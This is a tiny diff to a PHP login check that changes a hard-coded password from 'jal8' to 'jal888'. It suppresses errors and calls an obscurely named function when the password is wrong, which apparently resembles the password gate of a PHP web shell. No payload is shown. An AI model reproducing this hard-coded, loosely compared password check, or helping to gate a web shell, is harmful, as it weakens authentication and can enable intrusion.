@@ -1,7 +1,7 @@
 <?php
 error_reporting(0);
 session_start();
-if (md5($_POST["password"]) == md5('jal8')) {
+if (md5($_POST["password"]) == md5('jal888')) {
     $_SESSION["isLogin"] = true;
 } else {
     XWoSq();
